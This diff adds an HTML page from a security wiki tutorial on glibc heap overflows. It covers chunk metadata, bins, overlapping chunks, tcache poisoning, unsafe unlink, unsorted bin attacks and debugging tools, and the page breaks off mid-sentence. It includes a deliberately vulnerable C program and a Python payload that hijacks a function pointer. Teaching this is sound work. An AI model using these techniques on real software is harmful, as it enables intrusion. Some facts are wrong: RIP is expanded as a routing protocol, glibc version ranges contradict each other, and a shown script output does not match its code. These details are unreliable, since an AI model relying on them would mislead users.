@@ -1,0 +1,1175 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Heap Overflows | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Heap Overflows">
+		<meta name="keywords" content="fastbin, glibc, heap-overflow, malloc, memory-corruption, tcache, techniques, unlink">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Heap Overflows">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Heap overflows - corrupting heap chunk metadata, overwriting adjacent objects, tcache/fastbin attacks, and the glibc heap internals that make exploitation possible.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/fundamentals/heap-overflows.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Heap Overflows">
+		<meta name="twitter:description" itemprop="description" content="Heap overflows - corrupting heap chunk metadata, overwriting adjacent objects, tcache/fastbin attacks, and the glibc heap internals that make exploitation possible.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#heap-vs-stack-differences">Heap vs Stack Differences</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-glibc-heap-chunk-structure">The Glibc Heap Chunk Structure</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#glibc-bins-free-list-organization">Glibc Bins - Free List Organization</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-heap-overflow-primitive">The Heap Overflow Primitive</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#attack-vector-1-overlapping-chunks">Attack Vector 1 - Overlapping Chunks</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#attack-vector-2-tcache-poisoning">Attack Vector 2 - Tcache Poisoning</a></b>
+					<ul>
+						<li><a href="#overwriting-tcache-fd">Overwriting tcache fd</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#attack-vector-3-unsafe-unlink">Attack Vector 3 - Unsafe Unlink</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#attack-vector-4-unsorted-bin-attack">Attack Vector 4 - Unsorted Bin Attack</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#heap-debugging-tools">Heap Debugging Tools</a></b>
+					<ul>
+						<li><a href="#ltrace-library-calls">ltrace - library calls</a></li>
+						<li><a href="#valgrind-memcheck">valgrind memcheck</a></li>
+						<li><a href="#addresssanitizer">AddressSanitizer</a></li>
+						<li><a href="#gdb-with-pwndbg">GDB with pwndbg</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#complete-exploit-walkthrough">Complete Exploit Walkthrough</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#glibc-heap-exploitation-targets">Glibc Heap Exploitation Targets</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#locating-hooks">Locating Hooks</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#tcache-key-protection">Tcache Key Protection</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#safe-linking-protection">Safe-Linking Protection</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#heap-exploitation-methodology">Heap Exploitation Methodology</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#heap-allocation-and-mmap">Heap Allocation and mmap</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#heap-spray">Heap Spray</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#heap-vs-stack-overflow">Heap vs Stack Overflow</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/fundamentals/index.html">Fundamentals</a></li>
+						<li aria-current="page"><a href="/wiki/articles/fundamentals/heap-overflows.html">Heap Overflows</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="heap-overflows">Heap Overflows</h2>
+					<p>
+						Heap overflows - corrupting heap chunk metadata, overwriting adjacent objects, tcache/fastbin
+						attacks, and the glibc heap internals that make exploitation possible.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							The heap is where a program stores data whose lifetime is not tied to a function call. When
+							code copies more bytes than a heap buffer can hold, the overflow lands in allocator metadata
+							or in a neighboring object instead of in a return address. This article explains how the glibc
+							allocator lays out chunks, how corrupted metadata becomes overlap, double-free, and write primitives,
+							and how each protection added since glibc 2.26 changed the exploitation techniques.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/heap.html">Heap</a> - heap structure, brk/sbrk, mmap, malloc/free internals</li>
+							<li><a href="/wiki/articles/fundamentals/buffer-overflows.html">Buffer Overflows</a> - memory corruption fundamentals</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="heap-vs-stack-differences">Heap vs Stack Differences</h3>
+						<p>
+							A stack overflow is straightforward: overwrite the return address, control
+							<abbr title="Routing Information Protocol">RIP</abbr>
+							. A heap overflow has no return address to overwrite. The heap is a complex data structure managed
+							by the allocator (
+							<code>malloc</code>
+							/
+							<code>free</code>
+							in glibc). Overflowing a heap buffer means corrupting either:
+						</p>
+						<ol>
+							<li><b>Chunk metadata</b> - the headers glibc uses to manage allocated and free memory</li>
+							<li><b>Adjacent allocated objects</b> - other application data, function pointers, or C++ vtables</li>
+						</ol>
+						<p>
+							The exploitation strategies are fundamentally different. You're corrupting the allocator's internal
+							state, then triggering a chain of events that converts metadata corruption into arbitrary code
+							execution.
+						</p>
+					</section>
+					<section>
+						<h3 id="the-glibc-heap-chunk-structure">The Glibc Heap Chunk Structure</h3>
+						<p>
+							Every heap allocation is tracked by a chunk header. The header sits just before the user data
+							pointer returned by
+							<code>malloc</code>
+							:
+						</p>
+						<pre class="c">
+struct malloc_chunk {
+    size_t  prev_size;   // Size of previous chunk (if prev is free)
+    size_t  size;        // Size of this chunk | flags (low 3 bits)
+    // User data starts here, but if chunk is free:
+    struct malloc_chunk *fd;   // Forward pointer (free list)
+    struct malloc_chunk *bk;   // Backward pointer (free list)
+    // For large bins only:
+    struct malloc_chunk *fd_nextsize;
+    struct malloc_chunk *bk_nextsize;
+};
+						</pre>
+						<p>Memory layout of an allocated chunk:</p>
+						<pre class="plaintext">
+Low address
++------------+
+| prev_size  | 8 bytes (only meaningful if previous chunk is free)
++------------+
+| size       | 8 bytes (chunk size | flags in low 3 bits)
++------------+  &lt;- malloc() returns pointer to here
+| User data  |
+| ...        |
++------------+
+High address
+						</pre>
+						<p>
+							The
+							<code>size</code>
+							field's low 3 bits encode flags:
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Bit</th>
+									<th align="center">Name</th>
+									<th align="center">Meaning</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">0</td>
+									<td align="center">PREV_INUSE</td>
+									<td align="center">Previous chunk is allocated (1) or free (0)</td>
+								</tr>
+								<tr>
+									<td align="center">1</td>
+									<td align="center">IS_MMAPPED</td>
+									<td align="center">Chunk was allocated via mmap (1)</td>
+								</tr>
+								<tr>
+									<td align="center">2</td>
+									<td align="center">NON_MAIN_ARENA</td>
+									<td align="center">Chunk belongs to a thread arena (1)</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							Chunk sizes are always aligned to 8 bytes (32-bit) or 16 bytes (64-bit). The minimum chunk size
+							is 4 machine words:
+							<code>prev_size</code>
+							,
+							<code>size</code>
+							,
+							<code>fd</code>
+							,
+							<code>bk</code>
+							.
+						</p>
+					</section>
+					<section>
+						<h3 id="glibc-bins-free-list-organization">Glibc Bins - Free List Organization</h3>
+						<p>Free chunks are organized into bins - doubly-linked lists of chunks of similar size:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Bin Type</th>
+									<th align="center">Count</th>
+									<th align="center">Size Range</th>
+									<th align="center">Order</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Tcache</td>
+									<td align="center">64 bins per thread</td>
+									<td align="center">24-1032 bytes (step size 16)</td>
+									<td align="center">LIFO (singly-linked)</td>
+								</tr>
+								<tr>
+									<td align="center">Fastbins</td>
+									<td align="center">10 bins</td>
+									<td align="center">32-128 bytes (default)</td>
+									<td align="center">LIFO (singly-linked)</td>
+								</tr>
+								<tr>
+									<td align="center">Smallbins</td>
+									<td align="center">62 bins</td>
+									<td align="center">32-1008 bytes</td>
+									<td align="center">FIFO (doubly-linked)</td>
+								</tr>
+								<tr>
+									<td align="center">Largebins</td>
+									<td align="center">63 bins</td>
+									<td align="center">1024+ bytes</td>
+									<td align="center">Sorted by size, descending</td>
+								</tr>
+								<tr>
+									<td align="center">Unsorted bin</td>
+									<td align="center">1</td>
+									<td align="center">Any size</td>
+									<td align="center">FIFO (cache for recently freed chunks)</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							<b>Tcache</b>
+							(Thread Cache, glibc 2.26+): Per-thread LIFO cache. Each bin holds at most 7 chunks.
+							Tcache is the first place
+							<code>malloc</code>
+							looks, and the first place
+							<code>free</code>
+							returns chunks. Its simplicity
+							(no integrity checks in early versions) makes it the most targeted bin for exploitation.
+						</p>
+						<p>
+							<b>Fastbins</b>
+							: Singly-linked LIFO lists for small chunks (chunk size up to 128 bytes by default
+							on x86-64). Fastbins are never merged - chunks in fastbins keep their PREV_INUSE bit set so
+							adjacent chunks don't coalesce.
+						</p>
+					</section>
+					<section>
+						<h3 id="the-heap-overflow-primitive">The Heap Overflow Primitive</h3>
+						<p>A classic heap overflow:</p>
+						<pre class="c">
+// heap_overflow.c — Overflow from one heap chunk into the next
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(void) {
+    char *a = malloc(64);  // Chunk A
+    char *b = malloc(64);  // Chunk B — adjacent in memory
+
+    printf(&#34;A: %p, B: %p\n&#34;, a, b);
+    printf(&#34;Distance: %ld bytes\n&#34;, b - a);
+
+    // The user data of A is 64 bytes. The actual chunk is larger
+    // because of the header. strcpy past 64 bytes overwrites B&#39;s header.
+    strcpy(a, &#34;AAAA...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;);
+
+    free(b);  // Corrupted B&#39;s metadata — this may crash or misbehave
+    free(a);
+    return 0;
+}
+						</pre>
+						<p>
+							The distance between
+							<code>a</code>
+							and
+							<code>b</code>
+							is not 64 - it's 64 + 16 (chunk header overhead). On x86-64,
+							<code>malloc(64)</code>
+							returns a chunk of size 80 (64 usable + 16 header). The next chunk starts at
+							<code>a + 80</code>
+							, but
+							<code>a + 64</code>
+							is where the user data of A nominally ends.
+						</p>
+						<p>Layout:</p>
+						<pre class="plaintext">
+[MALLOC_CHUNK A]
+  prev_size: 0
+  size:      0x51 (80 | PREV_INUSE)
+  user data: 64 bytes of AAAAA...
+  [OVERFLOW STARTS HERE — beyond A&#39;s 64 bytes]
+  [bytes 65-72: overwrite B&#39;s prev_size]
+  [bytes 73-80: overwrite B&#39;s size field]
+  [bytes 81+:   overwrite B&#39;s user data]
+
+[MALLOC_CHUNK B]
+  prev_size: OVERWRITTEN
+  size:      OVERWRITTEN
+  user data: OVERWRITTEN
+						</pre>
+					</section>
+					<section>
+						<h3 id="attack-vector-1-overlapping-chunks">Attack Vector 1 - Overlapping Chunks</h3>
+						<p>
+							By overwriting the size field of chunk B, you can make the allocator believe B is a different
+							size. When B is freed and then reallocated, the returned chunk may overlap with a third chunk
+							C:
+						</p>
+						<pre class="c">
+// overlapping_chunks.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(void) {
+    char *a = malloc(0x38);  // Chunk A: chunk size 0x41
+    char *b = malloc(0x38);  // Chunk B: chunk size 0x41
+    char *c = malloc(0x38);  // Chunk C: chunk size 0x41
+
+    // Corrupt B&#39;s size field: make it 0x81 (covers B + C)
+    // This requires overflowing from A into B&#39;s header
+    strcpy(a, &#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;
+              &#34;AAAAAAAA&#34;       // Overwrite B&#39;s prev_size
+              &#34;\x81\x00\x00\x00\x00\x00\x00\x00&#34;);  // B&#39;s size = 0x81
+
+    free(b);  // Free B (now with fake size 0x81 -&gt; covers B+C)
+    char *d = malloc(0x78);  // Allocate 0x78 -&gt; returns B, but covers B+C
+    // d now overlaps with c — wri to d overwrites c&#39;s chunk
+    return 0;
+}
+						</pre>
+						<p>
+							After this,
+							<code>d</code>
+							points to the same memory region that contains both chunk B and chunk C. Writing
+							to
+							<code>d</code>
+							can modify chunk C's data and metadata, even though
+							<code>c</code>
+							is still "allocated."
+						</p>
+					</section>
+					<section>
+						<h3 id="attack-vector-2-tcache-poisoning">Attack Vector 2 - Tcache Poisoning</h3>
+						<p>
+							Tcache is a singly-linked LIFO list. Each tcache entry points to the next free chunk via the
+							<code>fd</code>
+							pointer (which lives at the start of the user data area for a free chunk). No integrity
+							checks in the basic tcache (glibc < 2.29 had none; 2.29 added a simple
+							<code>tcache_key</code>
+							sabotage
+							check).
+						</p>
+						<h4 id="overwriting-tcache-fd">Overwriting tcache fd</h4>
+						<pre class="c">
+// tcache_poison.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(void) {
+    // Step 1: malloc two chunks of the same size
+    char *a = malloc(0x48);  // tcache size 0x50
+    char *b = malloc(0x48);
+
+    // Step 2: free chunk a -&gt; goes to tcache
+    free(a);
+
+    // Step 3: overflow from... wait, we need an overflow source.
+    // In a real scenario, assume we can write past some other chunk.
+    // Here, use a use-after-free (simulated):
+    // a is free, but we assume we have a dangling pointer
+    // OR: overflow from a chunk before a into a&#39;s freed fd pointer
+
+    // For demo: directly overwrite a&#39;s fd (simulating overflow)
+    // Target: overwrite __free_hook with system
+    unsigned long *fd_ptr = (unsigned long *)a;
+    *fd_ptr = (unsigned long)0xdeadbeef;  // target address - 0x10
+
+    // Step 4: malloc twice. First returns a. Second returns the target.
+    char *x = malloc(0x48);  // returns a
+    char *y = malloc(0x48);  // returns address at 0xdeadbeef
+
+    printf(&#34;x = %p, y = %p\n&#34;, x, y);
+    return 0;
+}
+						</pre>
+						<p>The mechanism:</p>
+						<pre class="plaintext">
+Initial state (after free(a)):
+  tcache[0x50] -&gt; a -&gt; NULL
+  a-&gt;fd = NULL
+
+After overwriting a-&gt;fd:
+  tcache[0x50] -&gt; a -&gt; 0xdeadbeef -&gt; ??? (we target this address)
+
+First malloc(0x48):
+  returns a, pops a off tcache
+  tcache[0x50] -&gt; 0xdeadbeef
+
+Second malloc(0x48):
+  returns 0xdeadbeef
+  tcache[0x50] -&gt; (0xdeadbeef)-&gt;fd (whatever is there)
+						</pre>
+						<p>
+							The second malloc returns an arbitrary address. Write to
+							<code>y</code>
+							, and you write to
+							<code>0xdeadbeef</code>
+							. This is an arbitrary-write primitive.
+						</p>
+					</section>
+					<section>
+						<h3 id="attack-vector-3-unsafe-unlink">Attack Vector 3 - Unsafe Unlink</h3>
+						<p>
+							Before glibc 2.26 added safe unlinking, corrupting the fd/bk pointers of a free chunk allowed
+							an arbitrary write through the unlink macro. The original unlink was:
+						</p>
+						<pre class="c">
+// OLD (unsafe) unlink macro — glibc &lt; 2.26
+#define unlink(AV, P, BK, FD) {                    \
+    FD = P-&gt;fd;                                     \
+    BK = P-&gt;bk;                                     \
+    FD-&gt;bk = BK;    // Write BK to FD+0x18          \
+    BK-&gt;fd = FD;    // Write FD to BK+0x10          \
+}
+						</pre>
+						<p>
+							If an attacker overwrites
+							<code>P-&gt;fd</code>
+							and
+							<code>P-&gt;bk</code>
+							with controlled values, they can write arbitrary
+							data at arbitrary locations. Specifically, if:
+						</p>
+						<ul>
+							<li><code>P-&gt;fd = target_address - 0x18</code></li>
+							<li><code>P-&gt;bk = value_to_write</code></li>
+						</ul>
+						<p>
+							Then
+							<code>FD-&gt;bk = BK</code>
+							becomes
+							<code>*(target_address) = value_to_write</code>
+							- a direct arbitrary write.
+						</p>
+						<p>
+							Modern glibc replaced this with safe unlinking, which verifies the integrity of the doubly-linked
+							list:
+						</p>
+						<pre class="c">
+// CURRENT (safe) unlink — glibc &gt;= 2.26
+if (FD-&gt;bk != P || BK-&gt;fd != P) {
+    malloc_printerr(&#34;corrupted double-linked list&#34;);
+    abort();
+}
+FD-&gt;bk = BK;
+BK-&gt;fd = FD;
+						</pre>
+						<p>
+							This check (
+							<code>FD-&gt;bk == P</code>
+							and
+							<code>BK-&gt;fd == P</code>
+							) ensures the pointers are consistent. To pass
+							the check: -
+							<code>P-&gt;fd</code>
+							must point to a location where
+							<code>*(location + 0x18) == P</code>
+							-
+							<code>P-&gt;bk</code>
+							must
+							point to a location where
+							<code>*(location + 0x10) == P</code>
+						</p>
+						<p>
+							If you know a pointer to chunk P in memory (e.g., a global variable pointing to the chunk),
+							you can forge valid fd/bk that pass the check. The technique shifted from "any target" to "targets
+							where there's a pointer back to P."
+						</p>
+					</section>
+					<section>
+						<h3 id="attack-vector-4-unsorted-bin-attack">Attack Vector 4 - Unsorted Bin Attack</h3>
+						<p>
+							When a chunk is freed into the unsorted bin, its fd and bk pointers are set to point into the
+							<code>main_arena</code>
+							structure (specifically, the
+							<code>bins[0]</code>
+							and
+							<code>bins[1]</code>
+							fields). By corrupting the
+							bk pointer of a chunk in the unsorted bin, you can write
+							<code>&amp;main_arena.bins[0]</code>
+							to an arbitrary
+							location:
+						</p>
+						<pre class="c">
+victim-&gt;bk = target - 0x10;  // Corrupt bk (via overflow)
+// When the next malloc triggers sorting:
+bck = victim-&gt;bk;
+// ... later ...
+bck-&gt;fd = unsorted_chunks(av);  // *(target - 0x10 + 0x10) = &amp;main_arena
+						</pre>
+						<p>
+							This writes a libc address (
+							<code>&amp;main_arena.bins[0]</code>
+							) to the target location. While you can't
+							control
+							<em>what</em>
+							is written (it's always a libc address), you can control
+							<em>where</em>
+							it's written.
+							Common target:
+							<code>_IO_list_all</code>
+							to trigger a FILE stream attack, or
+							<code>global_max_fast</code>
+							to extend
+							the fastbin range.
+						</p>
+					</section>
+					<section>
+						<h3 id="heap-debugging-tools">Heap Debugging Tools</h3>
+						<h4 id="ltrace-library-calls">ltrace - library calls</h4>
+						<pre class="bash">
+$ ltrace -e malloc+free ./program
+malloc(64)                              = 0x5555555592a0
+malloc(64)                              = 0x5555555592f0
+free(0x5555555592a0)                    = &lt;void&gt;
+malloc(64)                              = 0x5555555592a0
+						</pre>
+						<h4 id="valgrind-memcheck">valgrind memcheck</h4>
+						<pre class="bash">
+$ gcc -g -o heap_overflow heap_overflow.c
+$ valgrind ./heap_overflow
+==12345== Invalid write of size 1
+==12345==    at 0x484A1F0: strcpy (vg_replace_strmem.c:552)
+==12345==    by 0x1091B0: main (heap_overflow.c:14)
+==12345==  Address 0x4a8c104 is 0 bytes after a block of size 64 alloc&#39;d
+==12345==    at 0x4846820: malloc (vg_replace_malloc.c:442)
+==12345==    by 0x10916F: main (heap_overflow.c:7)
+						</pre>
+						<h4 id="addresssanitizer">AddressSanitizer</h4>
+						<pre class="bash">
+$ gcc -fsanitize=address -g -o heap_overflow_asan heap_overflow.c
+$ ./heap_overflow_asan
+=================================================================
+==12345==ERROR: AddressSanitizer: heap-buffer-overflow
+==12345==WRITE of size 100 at 0x603000000060 thread T0
+==12345==    #0 strcpy
+==12345==    #1 main heap_overflow.c:14
+						</pre>
+						<h4 id="gdb-with-pwndbg">GDB with pwndbg</h4>
+						<pre class="bash">
+(gdb) heap            # Show all heap chunks
+(gdb) vis             # Visual heap layout
+(gdb) bins            # Show all free list bins
+(gdb) arenas          # Show memory arenas
+(gdb) arena           # Show main arena details
+(gdb) tcache          # Show thread cache contents
+(gdb) parseheap       # Walk and parse the heap
+						</pre>
+						<p>Manual heap inspection in GDB:</p>
+						<pre class="bash">
+(gdb) x/20gx chunk_a
+0x555555559290: 0x0000000000000000  0x0000000000000051  &lt;- prev_size, size
+0x5555555592a0: 0x4141414141414141  0x4141414141414141  &lt;- user data
+0x5555555592b0: 0x4141414141414141  0x4141414141414141
+0x5555555592c0: 0x4141414141414141  0x4141414141414141
+0x5555555592d0: 0x4141414141414141  0x4141414141414141
+0x5555555592e0: 0x4141414141414141  0x0000000000000051  &lt;- next chunk&#39;s header
+						</pre>
+					</section>
+					<section>
+						<h3 id="complete-exploit-walkthrough">Complete Exploit Walkthrough</h3>
+						<p>
+							A realistic scenario: a program allocates objects that contain function pointers, and a heap
+							overflow overwrites those pointers.
+						</p>
+						<pre class="c">
+// vuln_heap.c — Heap overflow targeting function pointers
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+struct command {
+    char name[32];
+    void (*execute)(const char *);
+};
+
+void cmd_list(const char *arg)  { printf(&#34;List: %s\n&#34;, arg); }
+void cmd_help(const char *arg)  { printf(&#34;Help: %s\n&#34;, arg); }
+void cmd_win(const char *arg)   { printf(&#34;WIN! %s\n&#34;, arg); }
+
+int main(void) {
+    char *buffer     = malloc(64);     // Chunk 1: overflow source
+    struct command *cmd1 = malloc(sizeof(struct command)); // Chunk 2
+    struct command *cmd2 = malloc(sizeof(struct command)); // Chunk 3
+
+    // Initialize command objects
+    strcpy(cmd1-&gt;name, &#34;list&#34;);
+    cmd1-&gt;execute = cmd_list;
+
+    strcpy(cmd2-&gt;name, &#34;help&#34;);
+    cmd2-&gt;execute = cmd_help;
+
+    // Read input (vulnerable — no bounds check)
+    printf(&#34;Enter command: &#34;);
+    ssize_t n = read(STDIN_FILENO, buffer, 256);  // buffer only 64!
+    buffer[n] = &#39;\0&#39;;
+
+    printf(&#34;Arg: &#34;);
+    strncpy(cmd1-&gt;name, buffer, 31);
+
+    // Execute the command
+    cmd1-&gt;execute(buffer);
+
+    free(buffer);
+    free(cmd1);
+    free(cmd2);
+    return 0;
+}
+						</pre>
+						<p>Compile for exploit testing:</p>
+						<pre class="bash">
+$ gcc -fno-stack-protector -no-pie -o vuln_heap vuln_heap.c
+						</pre>
+						<p>Check chunk layout:</p>
+						<pre class="bash">
+$ gdb ./vuln_heap
+(gdb) break main
+(gdb) run
+(gdb) next  # step past the mallocs
+(gdb) print buffer
+$1 = 0x5555555592a0
+(gdb) print cmd1
+$2 = 0x5555555592f0
+(gdb) print cmd2
+$3 = 0x555555559330
+(gdb) print cmd2 - cmd1
+$4 = 0x40  # 64 bytes between command objects (40 bytes struct + 24 bytes overhead)
+						</pre>
+						<p>
+							Overflow
+							<code>buffer</code>
+							past 64 bytes to overwrite
+							<code>cmd1</code>
+							's
+							<code>execute</code>
+							function pointer:
+						</p>
+						<pre class="plaintext">
+buffer (64 bytes user data + 16 header)     @ 0x5555555592a0
+cmd1  (40 bytes struct + 16 header)          @ 0x5555555592f0
+cmd2  (40 bytes struct + 16 header)          @ 0x555555559330
+
+Offset from buffer to cmd1-&gt;execute: (0x5555555592f0 - 0x5555555592a0) + 32 = 0x50 + 32 = 112
+						</pre>
+						<p>Verify the offset:</p>
+						<pre class="bash">
+$ python3 -c &#34;
+target_struct_offset = 0x5555555592f0 - 0x5555555592a0
+print(f&#39;offset to cmd1 struct: {target_struct_offset} bytes&#39;)
+execute_field_offset = target_struct_offset + 32
+print(f&#39;offset to cmd1-&gt;execute: {execute_field_offset} bytes&#39;)
+&#34;
+offset to cmd1 struct: 80 bytes
+execute_field_offset: 112 bytes
+						</pre>
+						<p>Build payload:</p>
+						<pre class="python">
+# exploit_heap.py
+import struct
+import sys
+
+# Address to overwrite execute function pointer with
+win_addr = 0x4011a9  # address of cmd_win (from objdump -t vuln_heap | grep cmd_win)
+
+payload  = b&#34;A&#34; * 112               # Fill buffer, overflow through chunk header + struct
+payload += struct.pack(&#34;&lt;Q&#34;, win_addr)  # Overwrite cmd1-&gt;execute
+payload += b&#34;\n&#34;                      # Input terminator
+
+sys.stdout.buffer.write(payload)
+						</pre>
+						<pre class="bash">
+$ python3 exploit_heap.py | ./vuln_heap
+Enter command: Arg: WIN! AAAAAAAAAAAAAAA...
+						</pre>
+						<p>
+							The program calls
+							<code>cmd_win</code>
+							instead of
+							<code>cmd_list</code>
+							. The function pointer was overwritten by
+							the heap overflow.
+						</p>
+					</section>
+					<section>
+						<h3 id="glibc-heap-exploitation-targets">Glibc Heap Exploitation Targets</h3>
+						<p>Common targets for converting heap corruption into code execution:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Target</th>
+									<th align="center">Glibc Version</th>
+									<th align="center">How</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>__malloc_hook</code></td>
+									<td align="center">< 2.26</td>
+									<td align="center">Function pointer called before every malloc; overwrite to redirect</td>
+								</tr>
+								<tr>
+									<td align="center"><code>__free_hook</code></td>
+									<td align="center">< 2.26</td>
+									<td align="center">Called before every free; overwrite to system()</td>
+								</tr>
+								<tr>
+									<td align="center"><code>__realloc_hook</code></td>
+									<td align="center">< 2.26</td>
+									<td align="center">Called before every realloc</td>
+								</tr>
+								<tr>
+									<td align="center"><code>__malloc_hook</code>+ one_gadget</td>
+									<td align="center">< 2.26</td>
+									<td align="center">Write one_gadget address to __malloc_hook</td>
+								</tr>
+								<tr>
+									<td align="center"><code>_IO_list_all</code></td>
+									<td align="center">All</td>
+									<td align="center">Overwrite to trigger virtual function call in FILE structures</td>
+								</tr>
+								<tr>
+									<td align="center"><code>__free_hook</code>via tcache</td>
+									<td align="center">2.26-2.33</td>
+									<td align="center">Arbitrary write to __free_hook address</td>
+								</tr>
+								<tr>
+									<td align="center"><code>exit_funcs</code></td>
+									<td align="center">All</td>
+									<td align="center">Overwrite atexit handler pointers</td>
+								</tr>
+								<tr>
+									<td align="center"><code>_dl_fini</code>/<code>link_map</code></td>
+									<td align="center">All</td>
+									<td align="center">Corrupt link_map->l_addr to redirect finalizer</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							<code>__malloc_hook</code>
+							and
+							<code>__free_hook</code>
+							were removed in glibc 2.34 because they were the most abused
+							exploitation primitives in history.
+						</p>
+					</section>
+					<section>
+						<h3 id="locating-hooks">Locating Hooks</h3>
+						<p>
+							Find the offset of
+							<code>__malloc_hook</code>
+							from the main_arena:
+						</p>
+						<pre class="bash">
+$ python3 -c &#34;
+from pwn import *
+libc = ELF(&#39;/usr/lib/libc.so.6&#39;)
+print(f&#39;__malloc_hook: {hex(libc.symbols[\&#34;__malloc_hook\&#34;])}&#39;)
+print(f&#39;__free_hook:   {hex(libc.symbols[\&#34;__free_hook\&#34;])}&#39;)
+print(f&#39;main_arena:    {hex(libc.symbols[\&#34;main_arena\&#34;])}&#39;)
+&#34;
+						</pre>
+						<p>
+							The main_arena is near
+							<code>__malloc_hook</code>
+							. In glibc,
+							<code>__malloc_hook</code>
+							is at
+							<code>main_arena - 0x10</code>
+							. You can compute one from a leak of the other.
+						</p>
+					</section>
+					<section>
+						<h3 id="tcache-key-protection">Tcache Key Protection</h3>
+						<p>
+							Glibc 2.29 added a
+							<code>tcache_key</code>
+							field to detect double-frees. The tcache entry structure became:
+						</p>
+						<pre class="c">
+typedef struct tcache_entry {
+    struct tcache_entry *next;   // Next entry in singly-linked list
+    struct tcache_perthread_struct *key;  // Pointer to tcache structure
+} tcache_entry;
+						</pre>
+						<p>
+							Before freeing a chunk to tcache, glibc checks if
+							<code>chunk-&gt;key == tcache</code>
+							- if so, the chunk
